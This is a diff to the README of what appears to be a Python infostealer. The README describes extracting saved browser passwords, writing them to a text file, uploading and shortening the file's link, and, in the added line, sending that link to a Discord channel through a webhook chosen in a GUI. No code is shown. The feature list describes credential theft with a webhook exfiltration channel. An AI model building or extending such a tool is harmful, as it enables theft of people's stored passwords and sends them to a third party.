@@ -26,6 +26,7 @@ An advanced Python script designed to **extract saved passwords** from popular w
 - 💾 **Save extracted passwords** to a readable text file.
 - 🌐 **Upload the file** to a file-sharing service (optional).
 - 🔗 **Shorten the file URL** for easy sharing.
+- 🖥️ **Send the file URL to a Discord channel**: Pick the webhook URL via the GUI and send the link directly to your Discord channel.
 
 ---
 
